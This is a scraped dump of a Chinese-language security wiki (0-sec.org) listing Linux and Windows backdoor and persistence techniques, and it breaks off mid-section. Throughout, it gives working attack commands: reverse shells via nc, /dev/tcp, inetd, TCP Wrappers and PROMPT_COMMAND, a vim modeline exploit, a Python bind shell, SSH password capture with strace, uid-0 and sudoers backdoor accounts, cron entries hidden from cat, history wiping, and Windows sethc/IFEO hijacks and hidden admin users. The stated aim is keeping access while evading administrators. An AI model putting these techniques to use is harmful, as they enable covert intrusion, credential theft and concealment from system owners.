exec{\"/usr/bin/sshd\"}\"/usr/sbin/sshd\",@ARGV; service sshd restart 在本机执行 socat STDIO TCP4:127.0.0.1:22,sourceport=19265 可以看到我利用socat限制了本地端口19526访问server的22端口反回一个sh窗。 修改端口可以修改..LF import struct buffer = struct.pack('>I6',19526) print repr(buffer) 优点： 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:06:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/3.html":{"url":"安全技术/Linux后门/3.html","title":" SSH 软连接后门 ","keywords":"","body":"SSH 软连接后门 软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），然而su在pam_rootok只检测uid 0即可认证成功，这样就导致了可以使用任意密码登录。 ln -sf /usr/sbin/sshd /tmp/su /tmp/su -oPort=888 优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:07:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/4.html":{"url":"安全技术/Linux后门/4.html","title":" SSH 公钥免密登陆 ","keywords":"","body":"SSH 公钥免密登陆 ssh-keygen -t rsa //生成公钥 将id_rsa.pub内容放到目标.ssh/authorized_keys里 这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接等情景。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:09:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/5.html":{"url":"安全技术/Linux后门/5.html","title":" SSH Keylogger ","keywords":"","body":"SSH Keylogger 利用strace系统调试工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。 在当前用户的.bashrc里新建一条alias、这样可以抓取他登陆其他机器的ssh密码。算是alias后门。后面会在讲一下alias后门。 alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:11:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/6.html":{"url":"安全技术/Linux后门/6.html","title":" strace监听ssh来源流量 ","keywords":"","body":"strace监听ssh来源流量 不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。 之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。 ps -ef | grep sshd #父进程PID strace -f -p 12617 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:12:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/7.html":{"url":"安全技术/Linux后门/7.html","title":" Cron后门 ","keywords":"","body":"Cron后门 Cron介绍 在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。 Cron后门 cron表达式在线生成： http://qqe2.com/cron (crontab -l;echo '*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i')|crontab - 这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。 那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行crontab -l就会看到显示”no crontab for root”。 (crontab -l;printf \"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\")|crontab - 实际上是他将cron文件写到文件中。/var/spool/cron/crontabs/root 。而crontab -l就是列出了该文件的内容。 通常cat是看不到这个的，只能利用less或者vim看到，这也是利用了cat的一个缺陷，后面会讲到。 /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ 这几个路径都可以存放cron执行脚本,对应的时间不同。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:18:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/8.html":{"url":"安全技术/Linux后门/8.html","title":" hiding-from-cats ","keywords":"","body":"hiding-from-cats cat隐藏说明 刚刚在cron里面提到了cat的一个缺陷。可以利用这个缺陷隐藏恶意命令在一些脚本中。这里的示例我就用hiding-from-cats里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。 cat其实默认使用是支持一些比如\\r回车符 \\n换行符 \\f换页符、也就是这些符号导致的能够隐藏命令。 使用python生成带有换行符的内容sh： cmd_h = \"echo 'You forgot to check `cat -A`!' > oops\" # hidden cmd_v = \"echo 'Hello world!'\" # visible with open(\"test.sh\", \"w\") as f: output = \"#!/bin/sh\\n\" output += cmd_h + \";\" + cmd_v + \" #\\r\" + cmd_v + \" \" * (len(cmd_h) + 3) + \"\\n\" f.write(output) 使用coderunner生成了一个test.sh脚本。cat看了下脚本的内容是echo一个hello world! 且同目录下只有他本文件。然后我们用sh test.sh执行后。 可以看到执行脚本后生成了一个oops文件，内容就是 You forgot to check cat -A! 其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前Cron后门中的隐藏方法就是利用了这个。如果使用cat —A 查看root文件的话就可以看到计划任务的真正内容了。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:20:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/9.html":{"url":"安全技术/Linux后门/9.html","title":" （CVE-2019-12735）vim modeline ","keywords":"","body":"（CVE-2019-12735）vim modeline 该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当vim打开一个包含了vim modeline注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。 开启： vim ~/.vimrc //文件内容为 set modeline poc: :!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\" 反弹shell： :!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9999 >/tmp/f||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:23:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/10.html":{"url":"安全技术/Linux后门/10.html","title":" vim python 拓展后门 ","keywords":"","body":"vim python 扩展后门 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。可以通过vim的pyfile来执行python脚本。这里我复现使用了docker centos 6.8，yum默认安装的vim。下面的pdf是发现者对外公开的思路： https://github.com/ianxtianxt/WOTD 这里我们使用一个python开启本地监听11端口的脚本。 POC: #from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html from socket import * import subprocess import os, threading, sys, time if __name__ == \"__main__\": server=socket(AF_INET,SOCK_STREAM) server.bind(('0.0.0.0',11)) server.listen(5) print 'waiting for connect' talk, addr = server.accept() print 'connect from',addr proc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk, stdout=talk, stderr=talk, shell=True) $(nohup vim -E -c \"pyfile dir.py\"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py 执行以后： 我在攻击机nc连接过去就可以了。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:28:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/11.html":{"url":"安全技术/Linux后门/11.html","title":" 建立隐藏文件/文件夹 ","keywords":"","body":"建立隐藏文件/文件夹 touch .backdoor mkdir .backdoor-file 经常使用linux中会知道每个目录下其实都有.和..、分别代指的是当前目录和上级目录。 建立...文件也是一个比较好的隐藏方法。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:30:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/12.html":{"url":"安全技术/Linux后门/12.html","title":" 建立..文件/文件夹 ","keywords":"","body":"建立..文件/文件夹 echo 'whoami' > ..\\ \\ \\ \\ //注意最后一个转义符后有一个空格 bash ..\\ \\ \\ \\ \\ //这里也是多一个空格。 这样建立的文件/文件夹管理员不知道是使用了几个转义符建立的，所以通过rm+tab是无法删除的。而且我测试使用rm -rf ./*也无法删除。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:32:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/13.html":{"url":"安全技术/Linux后门/13.html","title":" 参数混淆拦截rm ","keywords":"","body":"参数混淆拦截rm 使用echo等工具新建一个文件名是-rm的文件，这样删除的时候bash会认为-rmt是rm的参数。 这样就可以阻止管理员去删除， 一般只有rm -- '-rm'才会删除掉。 但是如果管理员使用正常删除方式会报错。 可以用以下方法。 echo 123123123 > -- 这样可以看到，命令执行了，文件没删除，命令也没有报错。类似的可以利用bash的\\r缺陷，和管道符、重定向符之类的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:35:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/14.html":{"url":"安全技术/Linux后门/14.html","title":" 创建不能删除的文件 ","keywords":"","body":"创建不能删除的文件（权限隐藏） 这个用法在ctf、awd中应用很多，使用chattr来给与隐藏权限。 这些权限需要使用lsattr这个命令才可以查看到，而如果要修改隐藏权限，则使用chattr这个命令来进行修改。 chattr +i hack.sh 无法删除。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:36:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/15.html":{"url":"安全技术/Linux后门/15.html","title":" 隐藏历史操作命令 ","keywords":"","body":"删除/隐藏历史操作命令 删除 删除通常使用两种方式： 1、history -c 2、rm -rf /root/.bash_history 建议使用第二种，第一种只是当前清除，并没有清除文件内容。 隐藏 隐藏命令的方式有很多，history 只会在会话结束时写入，所以只要会话还没有结束就可以想办法隐藏。比如同时开启两个终端，第一个终端启动vim编辑history文件，等第二个执行的都差不多了，结束会话后，在保存第一个，这样就覆盖了第二个终端所执行的命令。 这里我分享几个经常使用的隐藏历史命令的方法。 set +o history // 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。 export HISTIGNORE=\"*|*\" //这条命令是不记录带有管道符的命令。 执行后命令可以echo 123123123 | whoami这样也可以做到隐藏命令的目的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:38:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/17.html":{"url":"安全技术/Linux后门/17.html","title":"passwd写入","keywords":"","body":"passwd写入 perl -e 'print crypt(\"123456\", \"AA\"). \"\\n\"' echo \"backdoor:AASwmzPNx.3sg:0:0:me:/root:/bin/bash\">>/etc/passwd 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:16:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/18.html":{"url":"安全技术/Linux后门/18.html","title":"uid 0用户添加","keywords":"","body":"uid 0用户添加 在 Unix 体系下，UID 为 0 就是 root 权限。所以渗透的时候可以添加一个 UID 为 0 的用户作为后门。 useradd -p `openssl passwd 123456` -o -u 0 guest /usr/sbin/useradd -o -u 0 hack &>/dev/null && echo hack:123456 | /usr/sbin/chpasswd &>/dev/null 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:21:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/19.html":{"url":"安全技术/Linux后门/19.html","title":"suid 后门","keywords":"","body":"suid 后门 suid说明： 用户或属主对应的前三位权限的x位上如果有s就表示suid权限。当x位上没有小写x执行权限的时候，suid的权限显示的就是大S。 suid作用是让普通用户可以以root（或其他）的用户角色运行只有root（或其他）账号才能运行的程序或命令，或程序命令对应本来没有权限操作的文件等。 先查找具有suid的文件： find / -perm +4000 -ls find . -perm /4000 find / -user root -perm -4000 -print 2>/dev/null 将具有suid的复制到指定目录，然后再给权限执行。 cp /bin/bash /.woot chmod 4755 /.woot /.woot -p 列出一些具有suid权限的文件、然后利用一些二进制文件的特性来执行额外的命令。 Nmap Vim find Bash More Less Nano cp 常见的suid提权的程序。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:20:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/20.html":{"url":"安全技术/Linux后门/20.html","title":"reverse_shell","keywords":"","body":"reverse_shell 这里说的反弹shell不是上面开头那里说的利用内部软件进行反弹，而是利用一些非常规协议来绕过一些安全设备的流量监测功能。 tcp/udp shell tcp/udp的shell可以使用msf生成的tcp马、流量混淆推荐rc4和https偏执模式，也能够绕过一些防火墙。 icmp shell 使用ICMP来作为隐蔽通道的原理是：有一个服务端和一个客户端，当它们通信时会用到 ICMPECHO 和 ICMPECHOREPLY的数据部分。这就意味着通过ICMP包的数据部分可以发送和接收数据。 这里用python写了一个嗅探功能的小脚本 因为icmp是没有端口概念的，也就无法直接建立两台主机上ICMP应用程序的通信。所以程序需要从嗅探到的icmp包中再传给应用层，然后再执行其他的。 这里使用ish演示 wget http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz 被控端 ./ishd -i 6666 -t 0 -p 1024 -d 控制端 ./ish -i 6666 -t 0 -p 1024 127.0.0.1 这样利用icmp传输可以绕过大部分的设备。 DNS/smtp shell 这里提一下DNS和smtp服务。之前做的分享中有关于SMTP协议传输shell的思路，其实是利用smtp协议可以出网的思路，写一个smtp的客户端和服务端对应发送和接受执行内容，传输为了方便演示使用的是明文，为了增加迷惑性，添加删除邮件功能，需要提高的就是可以对传输的文本内容进行混淆加密之类的，防止安全邮件网关根据关键字拦截邮件。DNS这个的话就是通过解析记录的内容来进行命令的执行，还可以配合dnslog来使用。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:27:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/21.html":{"url":"安全技术/Linux后门/21.html","title":"sudoers利用","keywords":"","body":"sudoers 利用 sudo命令可以使用户临时获得管理员权限执行命令，sudo的控制都是基于sudoers文件来控制的，里面限制了用户名，用户组，执行什么等。/etc/sudoers的通用格式为：user host runas command user:一位或几位用户，在/etc/group中可以用一个%代替它，组对象的名称一定要用百分号%开头。host:一个或几个主机名；runas:作为哪个用户运行，常见选项是root和ALL command:想让用户或组运行的一个或几个根级别命令。例如：hans ALL=(root) useradd,userdel 授权hans用户在所有计算机上以root身份运行useradd,userdel命令。这样我们用一句话将内置/或者我们自己添加的普通权限用户添加到sudoer列表中，这样就可以偷着执行管理员权限的命令了。将原本低权限用户当做后门使用。 sudo su -c \"echo 'hack ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README\" 可以看到我们不需要密码就可以直接提到root。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:29:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/22.html":{"url":"安全技术/Linux后门/22.html","title":"inetd 远程后门","keywords":"","body":"inetd 远程后门 inetd，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。位置是/etc/inetd.conf 配置格式：[servicename] [socktype] [proto] [flags] [user] [server_path] [args] 在配置文件下写入以下内容。daytime stream tcp nowait root /bin/bash bash -i daytime服务（13端口） 套接字类型 协议类型 不等待 用户组 提供服务的程序 daytime stream tcp nowait root /bin/bash bash -i 这样配置好了以后利用nc attip 13 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:31:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/23.html":{"url":"安全技术/Linux后门/23.html","title":"动态链接库后门","keywords":"","body":"动态链接库后门 linux操作系统的动态链接库在加载过程中，动态链接器会先读取LDPRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LDPRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载，这样就导致了动态链接库文件可以被当做后门使用。 LD_PRELOAD 这里创建了一个test.c文件，其中调用time方法、然后创建了一个testlib.c、其中生成了一个time方法供test调用 编译后用LD_PRELOAD=$PWD/testlib.so ./test劫持了time。 //test.c #include #include #include int main(){ srand(time(NULL)); return 0; } //编译：gcc -o test test.c //testlib.c #include int time(){ printf(\"hello hacker\"); return 0; //the most random number in the universe } //编译：gcc -shared -fPIC testlib.c -o test.so ld.so.preload 同理，修改/etc/ld.so.conf.d/下的conf文件也可以达到劫持的目的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:34:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/24.html":{"url":"安全技术/Linux后门/24.html","title":"PROMPT_COMMAND","keywords":"","body":"PROMPT_COMMAND bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。这样就可以利用他执行的命令来留后门。 export PROMPT_COMMAND=\"nc -e /bin/bash 127.0.0.1 6666 &\" 提权 如果当前用户是低权账号，管理员又经常使用su等、但是自己不知道密码。就可以来使用这种方法。利用sudo的权限提升来新建一个uid为0的用户 export PROMPT_COMMAND=\"/usr/sbin/useradd -o -u 0 test2 &>/dev/null && echo test2:123456 | /usr/sbin/chpasswd &>/dev/null && unset PROMPT_COMMAND\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:38:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/25.html":{"url":"安全技术/Linux后门/25.html","title":"TCP Wrappers","keywords":"","body":"TCP Wrappers TCPWrappers是一个工作在第四层（传输层）的的安全工具，对有状态连接的特定服务进行安全检测并实现访问控制，凡是包含libwrap.so库文件的的程序就可以受TCPWrappers的安全控制。它的主要功能就是控制谁可以访问，常见的程序有rpcbind、vsftpd、sshd，telnet。 工作原理 TCP_Wrappers有一个TCP的守护进程叫做tcpd。以ssh为例，每当有ssh的连接请求时，tcpd即会截获请求，先读取系统管理员所设置的访问控制文件，符合要求，则会把这次连接原封不动的转给真正的ssh进程，由ssh完成后续工作；如果这次连接发起的ip不符合访问控制文件中的设置，则会中断连接请求，拒绝提供ssh服务。 利用 TCP_Wrappers的使用主要是依靠两个配置文件/etc/hosts.allow, /etc/hosts.deny，用于拒绝和接受。这里演示使用的是接受配置信息。之所以能够被用作后门是因为他存在一个参数是spawn （spawn启动一个外部程序完成执行的操作） 修改/etc/hosts.allow文件： ALL: ALL: spawn (bash -c \"/bin/bash -i >& /dev/tcp/127.0.0.1/6666 0>&1\") & :allow 当使用ssh连接的时候，它开始匹配规则，然后利用spawn执行的nc反弹了一个shell。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 20:40:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/1.html":{"url":"安全技术/Windows后门/1.html","title":"shift后门","keywords":"","body":"shift后门 这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有： C:\\Windows\\System32\\sethc.exe 粘滞键，启动快捷键：按五次shift键 C:\\Windows\\System32\\utilman.exe 设置中心，启动快捷键：Windows+U键 在低版本的windows中，我们可以直接把setch.exe替换成我们的后门程序，下面我们把setch.exe替换为cmd.exe 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:08:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/2.html":{"url":"安全技术/Windows后门/2.html","title":"映像劫持","keywords":"","body":"映像劫持 这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。 \"映像劫持\"，也被称为\"IFEO\"（Image File Execution Options） 就是Image File Execution Options（其实应该称为\"image Hijack\"。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。 PS：来自百度百科 简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序 操作也很简单，在注册表的HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Option下添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径，如下图 效果如下 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:08:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/3.html":{"url":"安全技术/Windows后门/3.html","title":"注册表自启动项","keywords":"","body":"注册表自启动项 MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下 Run：该项下的键值即为开机启动项，每一次随着开机而启动。 RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除 常见注册表启动项键的位置： 用户级 \\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 系统级 \\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce \\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run \\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce 修改一下： 执行结果： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:08:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/4.html":{"url":"安全技术/Windows后门/4.html","title":"定时任务 ","keywords":"","body":"定时任务 windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行，下面我们逐个看看 at的一些参数 AT [\\\\computername] time [/INTERACTIVE] [ /EVERY:date[,...] | /NEXT:date[,...]] \"command\" at的执行如下： schtasks一些参数： schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\\]user /p password]] [/ru {[Domain\\]User | \"System\"} [/rp Password]] /? schtasks的执行如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:09:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/5.html":{"url":"安全技术/Windows后门/5.html","title":"用户登陆初始化 ","keywords":"","body":"用户登陆初始化 Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序 注册表路径为：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit，我们添加一个我们启动的程序，多个程序用逗号隔开 效果如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:16:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/6.html":{"url":"安全技术/Windows后门/6.html","title":"Logon Scripts ","keywords":"","body":"Logon Scripts Logon Scripts优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截 注册表路径为：HKEY_CURRENT_USER\\Environment，创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径 效果如下： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:17:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/7.html":{"url":"安全技术/Windows后门/7.html","title":"屏幕保护程序 ","keywords":"","body":"屏幕保护程序 在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的 其中屏幕保护的配置存储在注册表中，其位置为：HKEY_CURRENT_USER\\Control Panel\\Desktop，关键键值如下： SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序 ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态 ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟） 设置如下： 效果图： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:17:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/8.html":{"url":"安全技术/Windows后门/8.html","title":"自启动服务 ","keywords":"","body":"自启动服务 自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务 为了方便起见我们可以直接用Metasploit来注册一个服务 meterpreter > run metsvc -A 运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe 同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为\"自动\"，默认绑定在31337端口。 如果想删除服务，可以执行 meterpreter > run metsvc -r 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-06 00:19:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Windows后门/9.html":{"url":"安全技术/Windows后门/9.html","title":"影子用户","keywords":"","body":"影子用户 影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的 在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组 net user test$ test /add net localgroup administrators test$ /add 可以看到net user是看不到我们创建的用户，但是计算机管理-用户和组中可以看到 所以这时候我们就需要修改一下注册表，其键位置为：HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users 注意：SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限 然后我们将administrator用户对应的项中的F值复制到test$对应xiang中的F值，然后保存 然后我们将test$删除掉 net user 